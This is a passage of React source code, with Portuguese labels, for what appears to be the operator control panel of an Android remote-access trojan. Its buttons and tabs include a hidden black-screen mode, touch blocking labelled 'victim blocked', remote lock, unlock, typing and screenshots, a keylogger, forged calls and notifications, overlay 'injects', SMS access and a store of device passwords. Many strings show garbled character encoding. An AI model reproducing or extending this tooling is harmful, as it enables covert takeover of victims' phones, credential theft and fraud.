                                setV2Customizations((prev) => ({
                                  ...prev,
                                  [key]: {
                                    ...(prev[key] || {}),
                                    customText: val,
                                    customColor: v2EditColor,
                                    textColor: v2EditTextColor,
                                    fontSize: v2EditFontSize,
                                    opacity: v2EditOpacity / 100,
                                    glow: v2EditGlow,
                                    borderStyle: v2EditBorderStyle
                                  }
                                }));
                              }
                            }}
                            placeholder="Digite o novo nome..."
                            className="w-full bg-[#030914] border border-emerald-500/50 rounded-xl px-2.5 py-1 text-xs text-white placeholder-slate-600 outline-none focus:border-emerald-400"
                            autoFocus
                          />
                        </div>

                        {/* Cor do Bloco */}
                        <div className="space-y-1">
                          <label className="text-[9px] font-bold text-emerald-400 uppercase tracking-wider block">
                            Cor do Bloco:
                          </label>
                          <div className="flex items-center gap-1.5 justify-between">
                            {['#ff2e5d', '#ff4757', '#F59E0B', '#EF4444', '#8B5CF6', '#EC4899', '#ff4d6d'].map((c) => (
                              <button
                                key={c}
                                type="button"
                                onClick={() => {
                                  setV2EditColor(c);
                                  if (v2SelectedNode) {
                                    const key = getNodeKey(v2SelectedNode);
                                    setV2Customizations((prev) => ({
                                      ...prev,
                                      [key]: {
                                        ...(prev[key] || {}),
                                        customText: v2EditLabel,
                                        customColor: c,
                                        textColor: v2EditTextColor,
                                        fontSize: v2EditFontSize,
                                        opacity: v2EditOpacity / 100,
                                        glow: v2EditGlow,
                                        borderStyle: v2EditBorderStyle
                                      }
                                    }));
                                  }
                                }}
                                className={`w-5 h-5 rounded-full transition-all border ${
                                  v2EditColor === c ? 'scale-125 border-white shadow-[0_0_8px_white]' : 'border-transparent opacity-80 hover:opacity-100'
                                }`}
                                style={{ backgroundColor: c }}
                              />
                            ))}
                          </div>
                        </div>

                        {/* Cor das Letras */}
                        <div className="space-y-1">
                          <label className="text-[9px] font-bold text-emerald-400 uppercase tracking-wider block">
                            Cor das Letras:
                          </label>
                          <div className="flex items-center gap-1.5 justify-between">
                            {['#FFFFFF', '#ff1e4d', '#00FF66', '#FFD700', '#FF007F', '#000000', '#F8FAFC'].map((tc) => (
                              <button
                                key={tc}
                                type="button"
                                onClick={() => {
                                  setV2EditTextColor(tc);
                                  if (v2SelectedNode) {
                                    const key = getNodeKey(v2SelectedNode);
                                    setV2Customizations((prev) => ({
                                      ...prev,
                                      [key]: {
                                        ...(prev[key] || {}),
                                        customText: v2EditLabel,
                                        customColor: v2EditColor,
                                        textColor: tc,
                                        fontSize: v2EditFontSize,
                                        opacity: v2EditOpacity / 100,
                                        glow: v2EditGlow,
                                        borderStyle: v2EditBorderStyle
                                      }
                                    }));
                                  }
                                }}
                                className={`w-5 h-5 rounded-full transition-all border ${
                                  v2EditTextColor === tc ? 'scale-125 border-white shadow-[0_0_8px_white]' : 'border-transparent opacity-80 hover:opacity-100'
                                }`}
                                style={{ backgroundColor: tc }}
                              />
                            ))}
                          </div>
                        </div>

                        {/* Tamanho & Fundo */}
                        <div className="grid grid-cols-2 gap-2 bg-[#030914] p-2 rounded-xl border border-[#122442]">
                          <div className="space-y-0.5">
                            <div className="flex justify-between text-[9px] font-bold text-slate-300">
                              <span>Tam. Texto:</span>
                              <span className="text-emerald-400 font-black">{v2EditFontSize}px</span>
                            </div>
                            <input
                              type="range"
                              min="10"
                              max="60"
                              value={v2EditFontSize}
                              onChange={(e) => {
                                const sz = Number(e.target.value);
                                setV2EditFontSize(sz);
                                if (v2SelectedNode) {
                                  const key = getNodeKey(v2SelectedNode);
                                  setV2Customizations((prev) => ({
                                    ...prev,
                                    [key]: {
                                      ...(prev[key] || {}),
                                      customText: v2EditLabel,
                                      customColor: v2EditColor,
                                      textColor: v2EditTextColor,
                                      fontSize: sz,
                                      opacity: v2EditOpacity / 100,
                                      glow: v2EditGlow,
                                      borderStyle: v2EditBorderStyle
                                    }
                                  }));
                                }
                              }}
                              className="w-full accent-emerald-400 cursor-pointer h-1"
                            />
                          </div>

                          <div className="space-y-0.5">
                            <div className="flex justify-between text-[9px] font-bold text-slate-300">
                              <span>Brilho Fundo:</span>
                              <span className="text-emerald-400 font-black">{v2EditOpacity}%</span>
                            </div>
                            <input
                              type="range"
                              min="10"
                              max="100"
                              step="5"
                              value={v2EditOpacity}
                              onChange={(e) => {
                                const op = Number(e.target.value);
                                setV2EditOpacity(op);
                                if (v2SelectedNode) {
                                  const key = getNodeKey(v2SelectedNode);
                                  setV2Customizations((prev) => ({
                                    ...prev,
                                    [key]: {
                                      ...(prev[key] || {}),
                                      customText: v2EditLabel,
                                      customColor: v2EditColor,
                                      textColor: v2EditTextColor,
                                      fontSize: v2EditFontSize,
                                      opacity: op / 100,
                                      glow: v2EditGlow,
                                      borderStyle: v2EditBorderStyle
                                    }
                                  }));
                                }
                              }}
                              className="w-full accent-emerald-400 cursor-pointer h-1"
                            />
                          </div>
                        </div>

                        {/* Formato da Borda */}
                        <div className="space-y-1">
                          <label className="text-[9px] font-bold text-emerald-400 uppercase tracking-wider block">
                            Formato da Borda:
                          </label>
                          <div className="flex items-center gap-1.5">
                            <button
                              type="button"
                              onClick={() => {
                                setV2EditBorderStyle('square');
                                if (v2SelectedNode) {
                                  const key = getNodeKey(v2SelectedNode);
                                  setV2Customizations((prev) => ({
                                    ...prev,
                                    [key]: {
                                      ...(prev[key] || {}),
                                      customText: v2EditLabel,
                                      customColor: v2EditColor,
                                      textColor: v2EditTextColor,
                                      fontSize: v2EditFontSize,
                                      opacity: v2EditOpacity / 100,
                                      glow: v2EditGlow,
                                      borderStyle: 'square'
                                    }
                                  }));
                                }
                              }}
                              className={`flex-1 py-1 rounded-lg text-[10px] font-bold border transition-all flex items-center justify-center gap-1 ${
                                v2EditBorderStyle === 'square'
                                  ? 'bg-rose-500 text-black border-emerald-300 font-black shadow-[0_0_10px_rgba(16,185,129,0.5)]'
                                  : 'bg-[#081326] text-slate-300 border-[#14284b] hover:text-white'
                              }`}
                            >
                              â¬› Borda Quadrada
                            </button>
                            <button
                              type="button"
                              onClick={() => {
                                setV2EditBorderStyle('rounded');
                                if (v2SelectedNode) {
                                  const key = getNodeKey(v2SelectedNode);
                                  setV2Customizations((prev) => ({
                                    ...prev,
                                    [key]: {
                                      ...(prev[key] || {}),
                                      customText: v2EditLabel,
                                      customColor: v2EditColor,
                                      textColor: v2EditTextColor,
                                      fontSize: v2EditFontSize,
                                      opacity: v2EditOpacity / 100,
                                      glow: v2EditGlow,
                                      borderStyle: 'rounded'
                                    }
                                  }));
                                }
                              }}
                              className={`flex-1 py-1 rounded-lg text-[10px] font-bold border transition-all flex items-center justify-center gap-1 ${
                                v2EditBorderStyle === 'rounded'
                                  ? 'bg-rose-500 text-black border-emerald-300 font-black shadow-[0_0_10px_rgba(16,185,129,0.5)]'
                                  : 'bg-[#081326] text-slate-300 border-[#14284b] hover:text-white'
                              }`}
                            >
                              ðŸŸ¡ Arredondada
                            </button>
                          </div>
                        </div>

                        {/* BotÃµes de AÃ§Ã£o */}
                        <div className="flex items-center justify-between gap-1.5 pt-2 border-t border-[#122442]">
                          <button
                            onClick={() => {
                              const key = getNodeKey(v2SelectedNode);
                              setV2Customizations((prev) => {
                                const next = { ...prev };
                                delete next[key];
                                return next;
                              });
                              setV2SelectedNode(null);
                              showToast('PersonalizaÃ§Ã£o removida!', 'info');
                            }}
                            className="px-2.5 py-1 rounded-lg bg-red-950/60 border border-red-500/40 text-red-400 hover:text-white text-[10px] font-bold flex items-center gap-1"
                          >
                            <Trash2 className="w-3 h-3" /> Reset
                          </button>

                          <button
                            onClick={() => {
                              if (v2SelectedNode.bounds) {
                                const { x, y, w, h } = v2SelectedNode.bounds;
                                const clickX = Math.round(x + w / 2);
                                const clickY = Math.round(y + h / 2);
                                sendCommand({ action: 'TAP', x: clickX, y: clickY });
                                showToast(`Clique enviado ao celular em (${clickX}, ${clickY})`, 'success');
                              }
                            }}
                            className="px-3.5 py-1 rounded-lg bg-amber-500/20 border border-amber-500/60 text-amber-300 hover:text-white text-[10px] font-bold flex items-center gap-1 shadow-[0_0_10px_rgba(245,158,11,0.3)]"
                          >
                            <Zap className="w-3.5 h-3.5 text-amber-400" /> Clicar no Celular
                          </button>
                        </div>
                      </>
                    ) : (
                      <div className="text-center py-8 text-slate-400 text-xs space-y-2 font-mono">
                        <Edit3 className="w-8 h-8 text-emerald-400/60 mx-auto animate-bounce" />
                        <div>Clique em qualquer bloco na Tela V2 para editÃ¡-lo individualmente.</div>
                        <button
                          onClick={() => setV2EditorMode('global')}
                          className="px-3 py-1 bg-rose-500/20 border border-emerald-500/50 text-emerald-300 rounded-lg text-[10px] font-bold"
                        >
                          Ir para Editar Tela V2 Geral
                        </button>
                      </div>
                    )}
                  </div>
                )}
              </div>
              )}

              {/* Toolbar Vertical de Atalhos RÃ¡pidos */}
              <div className="bg-[#081020] border border-[#152442] rounded-2xl p-2 flex flex-col gap-2 shadow-xl relative z-40 flex-shrink-0">
                {/* 1. MODO TELA OCULTA */}
                <div className="relative group">
                  <button
                    onClick={() => setShowBlackScreenChoiceModal(true)}
                    className={`p-2 rounded-xl border transition-all relative w-full flex items-center justify-center ${
                      isBlackScreen
                        ? 'bg-red-950 border-red-400 text-pink-300 shadow-[0_0_12px_rgba(6,182,212,0.5)]'
                        : 'bg-[#0a1426] border-[#152442] text-slate-400 hover:text-pink-300 hover:border-red-500/50'
                    }`}
                  >
                    {isBlackScreen ? (
                      <EyeOff className="w-3.5 h-3.5 text-pink-300 animate-pulse" />
                    ) : (
                      <Eye className="w-3.5 h-3.5 text-red-400" />
                    )}
                    <span className="absolute -top-1 -right-1 flex h-2 w-2">
                      {isBlackScreen && <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>}
                      <span className={`relative inline-flex rounded-full h-2 w-2 ${isBlackScreen ? 'bg-red-400 shadow-[0_0_6px_#22d3ee]' : 'bg-red-500/60'}`}></span>
                    </span>
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className="w-1.5 h-1.5 rounded-full bg-red-400"></span>
                    Modo Tela Oculta (Tela Preta)
                  </div>
                </div>

                {/* 2. BOTÃƒO BLOQUEIO DE TOQUE (LOGO ABAIXO DO OLHO) */}
                <div className="relative group">
                  <button
                    onClick={() => toggleTouchBlock(!isTouchBlocked)}
                    className={`p-2 rounded-xl border transition-all relative w-full flex items-center justify-center ${
                      isTouchBlocked
                        ? 'bg-rose-950 border-rose-400 text-rose-300 shadow-[0_0_12px_rgba(225,29,72,0.5)]'
                        : 'bg-rose-950/80 border-emerald-500/50 text-emerald-300 hover:text-white'
                    }`}
                  >
                    {isTouchBlocked ? (
                      <Lock className="w-3.5 h-3.5 text-rose-300" />
                    ) : (
                      <Unlock className="w-3.5 h-3.5 text-emerald-400" />
                    )}
                    <span className="absolute -top-1 -right-1 flex h-2 w-2">
                      {isTouchBlocked && <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-rose-400 opacity-75"></span>}
                      <span className={`relative inline-flex rounded-full h-2 w-2 ${isTouchBlocked ? 'bg-rose-500 shadow-[0_0_6px_#f43f5e]' : 'bg-rose-500 shadow-[0_0_6px_#ff4757]'}`}></span>
                    </span>
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className={`w-1.5 h-1.5 rounded-full ${isTouchBlocked ? 'bg-rose-500' : 'bg-rose-400'}`}></span>
                    {isTouchBlocked ? 'Bloquear Toque: ATIVADO (VÃ­tima bloqueada)' : 'Bloquear Toque: DESATIVADO (VNC/V2 liberado)'}
                  </div>
                </div>

                {/* 3. MODO PONTEIRO */}
                <div className="relative group">
                  <button
                    onClick={() => {
                      setIsPointerMode(!isPointerMode);
                      showToast('Modo ponteiro alternado', 'info');
                    }}
                    className={`p-2 rounded-xl border transition-all w-full flex items-center justify-center ${
                      isPointerMode ? 'bg-red-950 border-red-400 text-pink-300' : 'bg-[#0a1426] border-[#152442] text-slate-400 hover:text-slate-100'
                    }`}
                  >
                    <Sliders className="w-3.5 h-3.5" />
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className="w-1.5 h-1.5 rounded-full bg-red-400"></span>
                    Modo Ponteiro / EdiÃ§Ã£o de Blocos
                  </div>
                </div>



                {/* 5. CENTRAL ADMIN & PIN */}
                <div className="relative group">
                  <button
                    onClick={() => setSidePanelTab('admin_security')}
                    className={`p-2 rounded-xl border transition-all w-full flex items-center justify-center ${
                      sidePanelTab === 'admin_security'
                        ? 'bg-gradient-to-br from-amber-600 to-rose-600 border-amber-400 text-white shadow-[0_0_15px_rgba(245,158,11,0.6)]'
                        : 'bg-[#0a1426] border-amber-500/40 text-amber-400 hover:text-white hover:border-amber-400'
                    }`}
                  >
                    <ShieldCheck className="w-3.5 h-3.5" />
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className="w-1.5 h-1.5 rounded-full bg-amber-400"></span>
                    Central de Admin & Senhas PIN
                  </div>
                </div>

                {/* 6. BLOQUEAR TELA */}
                <div className="relative group">
                  <button
                    onClick={() => sendCommand({ action: 'LOCK' })}
                    className="p-2 rounded-xl bg-[#0a1426] border border-[#152442] text-slate-400 hover:text-amber-400 w-full flex items-center justify-center"
                  >
                    <Lock className="w-3.5 h-3.5" />
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className="w-1.5 h-1.5 rounded-full bg-amber-400"></span>
                    Bloquear Tela do Celular
                  </div>
                </div>

                {/* 7. DESBLOQUEAR APARELHO */}
                <div className="relative group">
                  <button
                    onClick={() => sendCommand({ action: 'UNLOCK' })}
                    className="p-2 rounded-xl bg-[#0a1426] border border-[#152442] text-slate-400 hover:text-emerald-400 w-full flex items-center justify-center"
                  >
                    <Unlock className="w-3.5 h-3.5" />
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className="w-1.5 h-1.5 rounded-full bg-rose-400"></span>
                    Desbloquear Aparelho
                  </div>
                </div>

                {/* 8. DIGITAR NO APARELHO */}
                <div className="relative group">
                  <button
                    onClick={() => setShowKeyboardModal(true)}
                    className="p-2 rounded-xl bg-[#0a1426] border border-[#152442] text-slate-400 hover:text-red-400 w-full flex items-center justify-center"
                  >
                    <Keyboard className="w-3.5 h-3.5" />
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className="w-1.5 h-1.5 rounded-full bg-red-400"></span>
                    Digitar Texto no Celular
                  </div>
                </div>

                {/* 9. AUMENTAR VOLUME */}
                <div className="relative group">
                  <button
                    onClick={() => sendCommand({ action: 'VOLUME_UP' })}
                    className="p-2 rounded-xl bg-[#0a1426] border border-[#152442] text-slate-400 hover:text-red-400 w-full flex items-center justify-center"
                  >
                    <Volume2 className="w-3.5 h-3.5" />
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className="w-1.5 h-1.5 rounded-full bg-red-400"></span>
                    Aumentar Volume
                  </div>
                </div>

                {/* 10. DIMINUIR VOLUME */}
                <div className="relative group">
                  <button
                    onClick={() => sendCommand({ action: 'VOLUME_DOWN' })}
                    className="p-2 rounded-xl bg-[#0a1426] border border-[#152442] text-slate-400 hover:text-red-400 w-full flex items-center justify-center"
                  >
                    <Volume1 className="w-3.5 h-3.5" />
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className="w-1.5 h-1.5 rounded-full bg-red-400"></span>
                    Diminuir Volume
                  </div>
                </div>

                {/* 11. TIRAR PRINT */}
                <div className="relative group">
                  <button
                    onClick={() => {
                      sendCommand({ action: 'TAKE_SCREENSHOT' });
                      showToast('Captura solicitada!', 'success');
                    }}
                    className="p-2 rounded-xl bg-[#0a1426] border border-[#152442] text-slate-400 hover:text-red-400 w-full flex items-center justify-center"
                  >
                    <Camera className="w-3.5 h-3.5" />
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className="w-1.5 h-1.5 rounded-full bg-red-400"></span>
                    Capturar Tela (Tirar Print)
                  </div>
                </div>

                {/* 12. AÃ‡Ã•ES RÃPIDAS */}
                <div className="relative group">
                  <button
                    onClick={() => setQuickActionModal(true)}
                    className="p-2 rounded-xl bg-[#0a1426] border border-[#152442] text-slate-400 hover:text-red-400 w-full flex items-center justify-center"
                  >
                    <Send className="w-3.5 h-3.5" />
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className="w-1.5 h-1.5 rounded-full bg-red-400"></span>
                    Menu de AÃ§Ãµes RÃ¡pidas
                  </div>
                </div>

                {/* 13. CENTRAL DE LIGAÃ‡Ã•ES & FAKE CALL */}
                <div className="relative group">
                  <button
                    onClick={() => setSidePanelTab('fake_call')}
                    className="p-2 rounded-xl bg-gradient-to-r from-red-600/30 to-red-600/30 border border-red-500/50 text-red-400 hover:text-white hover:border-red-400 w-full flex items-center justify-center shadow-[0_0_10px_rgba(6,182,212,0.3)] transition-all"
                  >
                    <PhoneIncoming className="w-3.5 h-3.5 animate-pulse" />
                  </button>
                  <div className="absolute right-full top-1/2 -translate-y-1/2 mr-2.5 hidden group-hover:flex items-center gap-1.5 px-2.5 py-1 bg-[#081020]/95 border border-red-500/50 rounded-xl text-[10px] font-mono font-bold text-pink-300 whitespace-nowrap shadow-[0_0_15px_rgba(6,182,212,0.3)] z-50 pointer-events-none">
                    <span className="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse"></span>
                    Central de Fake Call & Voz
                  </div>
                </div>
              </div>

              {/* ======================================================== */}
              {/* ðŸ“‹ PAINEL LATERAL DIREITO: NOTIFICAÃ‡Ã•ES & CONFIGURAÃ‡Ã•ES  */}
              {/* ======================================================== */}
              <div className="w-full max-w-[360px] sm:w-[350px] bg-[#081020]/90 backdrop-blur-2xl border border-[#14233e] rounded-2xl p-3 shadow-2xl space-y-3 font-mono text-xs flex-shrink-0">
                    {/* ðŸ¤– ROBÃ” ASSISTENTE IA, ðŸ“ž FAKE CALL & ðŸ”” FORJAR NOTIF. (Destaques Superiores) */}
                    <div className="grid grid-cols-3 gap-1.5">
                      <button
                        onClick={() => setSidePanelTab('assistant')}
                        className={`py-2 px-1.5 rounded-xl uppercase flex items-center justify-between text-xs font-mono font-black transition-all ${
                          sidePanelTab === 'assistant'
                            ? 'bg-gradient-to-r from-red-600 via-red-600 to-red-500 text-white shadow-[0_0_20px_rgba(6,182,212,0.5)] border border-red-400/60 ring-1 ring-red-400/40'
                            : 'bg-gradient-to-r from-[#0a1835] to-[#071124] text-pink-300 hover:text-white border border-red-500/25 hover:border-red-400/50 hover:bg-[#0d2146]'
                        }`}
                        title="RobÃ´ Assistente por Chat (Executa ordens no aparelho)"
                      >
                        <div className="flex items-center gap-1 truncate">
                          <Bot className="w-3.5 h-3.5 text-red-400 shrink-0" />
                          <span className="tracking-wider truncate text-[10px]">Assistente</span>
                        </div>
                        <span className="w-1.5 h-1.5 rounded-full bg-rose-400 animate-pulse shrink-0"></span>
                      </button>

                      <button
                        onClick={() => setSidePanelTab('fake_call')}
                        className={`py-2 px-1.5 rounded-xl uppercase flex items-center justify-between text-xs font-mono font-black transition-all ${
                          sidePanelTab === 'fake_call'
                            ? 'bg-gradient-to-r from-red-600 via-red-600 to-red-500 text-white shadow-[0_0_20px_rgba(6,182,212,0.5)] border border-red-400/60 ring-1 ring-red-400/40'
                            : 'bg-gradient-to-r from-[#0a1835] to-[#071124] text-pink-300 hover:text-white border border-red-500/25 hover:border-red-400/50 hover:bg-[#0d2146]'
                        }`}
                        title="Central de Fake Call (Forjar Chamadas Entrantes no Aparelho)"
                      >
                        <div className="flex items-center gap-1 truncate">
                          <PhoneIncoming className="w-3.5 h-3.5 text-pink-300 animate-pulse shrink-0" />
                          <span className="tracking-wider truncate text-[10px]">ðŸ“ž Fake Call</span>
                        </div>
                        <span className="w-1.5 h-1.5 rounded-full bg-red-400 animate-ping shrink-0"></span>
                      </button>

                      <button
                        onClick={() => setSidePanelTab('fake_notif')}
                        className={`py-2 px-1.5 rounded-xl uppercase flex items-center justify-between text-xs font-mono font-black transition-all ${
                          sidePanelTab === 'fake_notif'
                            ? 'bg-gradient-to-r from-red-600 via-red-600 to-pink-500 text-white shadow-[0_0_20px_rgba(6,182,212,0.5)] border border-red-400/60 ring-1 ring-red-400/40'
                            : 'bg-gradient-to-r from-[#0a1835] to-[#071124] text-pink-300 hover:text-white border border-red-500/25 hover:border-red-400/50 hover:bg-[#0d2146]'
                        }`}
                        title="Central de Forjar NotificaÃ§Ã£o (Forjar Push Banner no Celular Alvo)"
                      >
                        <div className="flex items-center gap-1 truncate">
                          <Bell className="w-3.5 h-3.5 text-pink-300 animate-bounce shrink-0" />
                          <span className="tracking-wider truncate text-[10px]">ðŸ”” Forjar Notif.</span>
                        </div>
                        <span className="w-1.5 h-1.5 rounded-full bg-red-400 animate-ping shrink-0"></span>
                      </button>
                    </div>

                    {/* Header do Painel Lateral: Abas Organizadas */}
                    <div className="bg-[#091224] border border-[#14233e] rounded-xl p-1 grid grid-cols-4 gap-1 text-[8.5px] font-bold">
                      <button
                        onClick={() => setSidePanelTab('v2_elements')}
                        className={`py-1.5 px-1 text-center rounded-lg uppercase flex items-center justify-center gap-1 transition-all ${
                          sidePanelTab === 'v2_elements'
                            ? 'bg-gradient-to-r from-red-600 via-teal-600 to-rose-600 text-white shadow-[0_0_12px_rgba(6,182,212,0.6)] font-black ring-1 ring-red-400/50'
                            : 'bg-[#0b162b] text-pink-300 hover:text-white'
                        }`}
                        title="Ver lista de elementos detectados na Tela V2 em tempo real"
                      >
                        <Grid className="w-3 h-3 shrink-0 text-pink-300" />
                        <span className="truncate font-black">ðŸ§© ELEMENTOS ({visibleV2Nodes.length})</span>
                      </button>

                      <button
                        onClick={() => setSidePanelTab('fake_call')}
                        className={`py-1.5 px-1 text-center rounded-lg uppercase flex items-center justify-center gap-1 transition-all ${
                          sidePanelTab === 'fake_call'
                            ? 'bg-gradient-to-r from-red-600 via-red-600 to-red-500 text-white shadow-[0_0_12px_rgba(6,182,212,0.6)] font-black ring-1 ring-red-400/50'
                            : 'bg-[#0b162b] text-pink-300 hover:text-white'
                        }`}
                        title="Central de Fake Call (Forjar Chamadas Entrantes no Aparelho)"
                      >
                        <PhoneIncoming className="w-3 h-3 shrink-0 text-pink-300 animate-pulse" />
                        <span className="truncate font-black">ðŸ“ž LIGAÃ‡ÃƒO</span>
                      </button>

                      <button
                        onClick={() => setSidePanelTab('fake_notif')}
                        className={`py-1.5 px-1 text-center rounded-lg uppercase flex items-center justify-center gap-1 transition-all ${
                          sidePanelTab === 'fake_notif'
                            ? 'bg-gradient-to-r from-red-600 via-red-600 to-pink-500 text-white shadow-[0_0_12px_rgba(6,182,212,0.6)] font-black ring-1 ring-red-400/50'
                            : 'bg-[#0b162b] text-pink-300 hover:text-white'
                        }`}
                        title="Central de Forjar NotificaÃ§Ã£o Flutuante no Celular Alvo"
                      >
                        <Bell className="w-3 h-3 shrink-0 text-pink-300 animate-bounce" />
                        <span className="truncate font-black">ðŸ”” FORJAR NOTIF.</span>
                      </button>

                      <button
                        onClick={() => setSidePanelTab('admin_security')}
                        className={`py-1.5 px-1 text-center rounded-lg uppercase flex items-center justify-center gap-1 transition-all ${
                          sidePanelTab === 'admin_security'
                            ? 'bg-gradient-to-r from-amber-600 via-rose-600 to-red-600 text-white shadow-[0_0_12px_rgba(244,63,94,0.6)] font-black ring-1 ring-amber-400/50'
                            : 'bg-[#0b162b] text-amber-400 hover:text-white hover:bg-[#10203e]'
                        }`}
                        title="Central de FunÃ§Ãµes, Admin, RemoÃ§Ã£o e Lock do Aparelho"
                      >
                        <Zap className="w-3 h-3 shrink-0 text-amber-300" />
                        <span className="truncate font-black">âš¡ ADMIN</span>
                      </button>

                      <button
                        onClick={() => setSidePanelTab('notes')}
                        className={`py-1.5 px-1 text-center rounded-lg uppercase flex items-center justify-center gap-1 transition-all ${
                          sidePanelTab === 'notes'
                            ? 'bg-gradient-to-r from-rose-600 via-teal-600 to-red-600 text-white shadow-[0_0_12px_rgba(16,185,129,0.6)] font-black ring-1 ring-rose-400/50'
                            : 'bg-[#0b162b] text-emerald-400 hover:text-white hover:bg-[#0c241d]'
                        }`}
                        title="Bloco de Notas e Senhas do Aparelho (Salvo Auto)"
                      >
                        <FileText className="w-3 h-3 shrink-0 text-emerald-300" />
                        <span className="truncate font-black">ðŸ“ NOTAS</span>
                      </button>

                      <button
                        onClick={() => setSidePanelTab('injects')}
                        className={`py-1.5 px-1 text-center rounded-lg uppercase flex items-center justify-center gap-1 transition-all ${
                          sidePanelTab === 'injects'
                            ? 'bg-red-600 text-white shadow-[0_0_12px_rgba(37,99,235,0.6)] font-black'
                            : 'bg-[#0b162b] text-red-400 hover:text-white'
                        }`}
                      >
                        <span className="truncate">ðŸŽ­ Injects</span>
                      </button>

                      <button
                        onClick={() => setSidePanelTab('keylogger')}
                        className={`py-1.5 px-1 text-center rounded-lg uppercase flex items-center justify-center gap-1 transition-all ${
                          sidePanelTab === 'keylogger'
                            ? 'bg-[#0070f3] text-white shadow-[0_0_12px_rgba(0,112,243,0.4)] font-bold'
                            : 'bg-[#0b162b] text-slate-400 hover:text-slate-200'
                        }`}
                      >
                        <Keyboard className="w-3 h-3 shrink-0" />
                        <span className="truncate">Keylog ({keylogs.length})</span>
                      </button>

                      <button
                        onClick={() => setSidePanelTab('notifications')}
                        className={`py-1.5 px-1 text-center rounded-lg uppercase flex items-center justify-center gap-1 transition-all ${
                          sidePanelTab === 'notifications'
                            ? 'bg-[#0070f3] text-white shadow-[0_0_12px_rgba(0,112,243,0.4)]'
                            : 'bg-[#0b162b] text-slate-400 hover:text-slate-200'
                        }`}
                      >
                        <Bell className="w-3 h-3 shrink-0" />
                        <span className="truncate">Notif. ({notifications.length})</span>
                      </button>

                      <button
                        onClick={() => setSidePanelTab('quick_controls')}
                        className={`py-1.5 px-1 text-center rounded-lg uppercase flex items-center justify-center gap-1 transition-all ${
                          sidePanelTab === 'quick_controls'
                            ? 'bg-[#0070f3] text-white shadow-[0_0_12px_rgba(0,112,243,0.4)]'
                            : 'bg-[#0b162b] text-slate-400 hover:text-slate-200'
                        }`}
                      >
                        <Settings className="w-3 h-3 shrink-0" />
                        <span className="truncate">Hardware</span>
                      </button>

                      <button
                        onClick={() => setSidePanelTab('sms_quick')}
                        className={`py-1.5 px-1 text-center rounded-lg uppercase flex items-center justify-center gap-1 transition-all ${
                          sidePanelTab === 'sms_quick'
                            ? 'bg-[#0070f3] text-white shadow-[0_0_12px_rgba(0,112,243,0.4)]'
                            : 'bg-[#0b162b] text-slate-400 hover:text-slate-200'
                        }`}
                      >
                        <MessageSquare className="w-3 h-3 shrink-0" />
                        <span className="truncate">SMS</span>
                      </button>
                    </div>

                {/* ======================================================== */}
                {/* Aba 0: ROBÃ” ASSISTENTE POR CHAT (Executa no Aparelho)   */}
                {/* ======================================================== */}
                {sidePanelTab === 'assistant' && (
